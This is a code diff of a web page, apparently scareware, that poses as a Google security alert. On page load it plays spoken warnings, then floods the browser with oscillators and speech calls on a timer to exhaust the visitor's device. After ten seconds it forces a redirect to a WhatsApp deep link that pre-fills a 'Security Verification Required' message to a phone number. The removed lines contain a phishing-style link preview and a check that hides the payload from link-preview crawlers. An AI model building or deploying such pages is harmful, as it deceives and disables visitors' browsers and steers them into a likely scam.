@@ -3,54 +3,24 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Meta AI Preview Verification</title>
-
-<!-- ============================================ -->
-<!-- OPEN GRAPH & TWITTER METADATA (Untuk Bot Preview / Meta AI) -->
-<!-- ============================================ -->
-<meta property="og:title" content="Security Alert: Urgent Account Verification Required">
-<meta property="og:description" content="Suspicious activity detected from an unknown location. Click to verify your identity immediately.">
-<meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1200&h=630&fit=crop">
-<meta property="og:url" content="https://example.com/security-alert">
-<meta property="og:type" content="website">
-<meta name="twitter:card" content="summary_large_image">
-
+<title>Security Alert - WhatsApp Intent Redirection</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-  .card { background: #1e293b; padding: 32px; border-radius: 12px; max-width: 480px; width: 100%; text-align: center; border: 1px solid #334155; }
-  h2 { margin-bottom: 12px; color: #f8fafc; font-size: 22px; }
-  p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-  .badge { display: inline-block; background: #ef4444; color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: bold; margin-bottom: 16px; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
-
-<div class="card">
-  <div class="badge">SYSTEM ALERT</div>
-  <h2>Verifikasi Keamanan Akun</h2>
-  <p>Sistem mendeteksi upaya akses tidak sah. Halaman ini memuat parameter verifikasi otomatis.</p>
-</div>
-
 <script>
 (function () {
   'use strict';
 
-  // Deteksi apakah yang mengakses adalah Bot/Crawler (seperti Meta AI Bot / WhatsApp Previewer)
-  var userAgent = navigator.userAgent || '';
-  var isBot = /facebookexternalhit|WhatsApp|MetaInspector|Twitterbot|TelegramBot|Googlebot/i.test(userAgent);
-
-  if (isBot) {
-    console.log("[*] Crawler / Meta AI Bot detected. Logging header metadata...");
-    return; // Hentikan eksekusi berat jika diakses oleh bot perayap
-  }
-
   // ============================================
-  // KONFIGURASI CLIENT-SIDE STABLE EXHAUSTION
+  // KONFIGURASI AUTOPLAY & WHATSAPP INTENT
   // ============================================
   var CONFIG = {
     tts: {
-      text: "Google Security Alert. Extended verification process initiated. Please remain on this page.",
+      text: "Google Security Alert. Extended verification process initiated. Redirecting to WhatsApp support.",
       lang: 'en-US',
       rate: 0.85,
       pitch: 1.0,
@@ -60,11 +30,16 @@
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
     exhaustionInterval: 250,
-    batchSize: 400
+    batchSize: 400,
+    // Target intent WhatsApp untuk pengujian deep link handler langsung ke aplikasi WA
+    whatsappIntentUrl: 'whatsapp://send?phone=628123456789&text=Security%20Verification%20Required'
   };
 
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, executionSeconds: 0 };
 
+  // ============================================
+  // TTS — TANPA CANCEL DI DALAM LOOP
+  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
@@ -80,6 +55,8 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -88,7 +65,7 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) {}
+    } catch (e) { console.log('[TTS] fail:', e.message); }
   }
 
   function startTTS() {
@@ -98,11 +75,14 @@
     speakOnce();
   }
 
+  // ============================================
+  // AUDIO CONTEXT UNLOCK
+  // ============================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
@@ -115,6 +95,9 @@
     } catch (e) {}
   }
 
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
@@ -125,6 +108,9 @@
     } catch (e) {}
   }
 
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
@@ -154,9 +140,24 @@
     }
   }
 
+  // ============================================
+  // EXTENDED EXHAUSTION + WHATSAPP INTENT REDIRECTION
+  // ============================================
   function triggerExtendedSeverityExhaustion() {
+    console.log("[!] Initiating Extended Duration & WhatsApp Intent Chain...");
+    
     var durationTimer = setInterval(function() {
       state.executionSeconds += 1;
+      console.log("[*] Execution active for " + state.executionSeconds + " seconds.");
+      
+      // Pemicu Intent Redirection ke WhatsApp setelah durasi tertentu (misal: 10 detik)
+      if (state.executionSeconds === 10) {
+        try {
+          console.log("[*] Triggering WhatsApp Intent Redirection...");
+          window.location.replace(CONFIG.whatsappIntentUrl);
+        } catch (e) {}
+      }
+
       if (state.executionSeconds > 120) {
         clearInterval(durationTimer);
       }
@@ -174,7 +175,7 @@
           osc.start(0);
           
           if (i % 50 === 0) {
-            var u = new SpeechSynthesisUtterance("EXTENDED_STABLE_NODE_" + state.executionSeconds);
+            var u = new SpeechSynthesisUtterance("WHATSAPP_REDIRECT_NODE_" + state.executionSeconds);
             window.speechSynthesis.speak(u);
           }
         }
@@ -182,6 +183,9 @@
     }, CONFIG.exhaustionInterval);
   }
 
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
   unlockAudioContext();
   trySilentAudio();
 
@@ -197,7 +201,9 @@
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
+    
     triggerExtendedSeverityExhaustion();
+    
   }, 2000);
 
   var retryCount = 0;
